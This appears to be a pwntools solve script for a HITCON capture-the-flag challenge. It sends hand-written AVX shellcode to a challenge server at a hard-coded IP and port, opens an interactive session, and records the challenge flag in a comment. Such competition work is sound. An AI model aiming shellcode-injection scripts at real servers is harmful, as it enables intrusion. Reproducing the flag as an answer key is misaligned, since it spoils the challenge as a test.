#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return process(['release/server.rb'])
    else:
        return remote('52.192.42.215', 9427)


def main():
    context.arch = 'amd64'
    shellcode = asm('''
vzeroall
vperm2i128 ymm0, ymm0, [0x2170000], 0x20
vmovapd [0x2170000], ymm1
vperm2i128 ymm1, ymm0, [0x2170000], 0x01

mov rax, 60
mov rdi, 0
syscall
''')
    with connect() as tube:
        tube.recvuntil(b'Size of shellcode? (MAX: 2000)\n')
        tube.sendline(str(len(shellcode)))
        tube.recvuntil(f'Reading {len(shellcode)} bytes..\n'.encode())
        tube.send(shellcode)
        tube.interactive()  # hitcon{whats happened happened, this is the mechanism of the world}


if __name__ == '__main__':
    main()
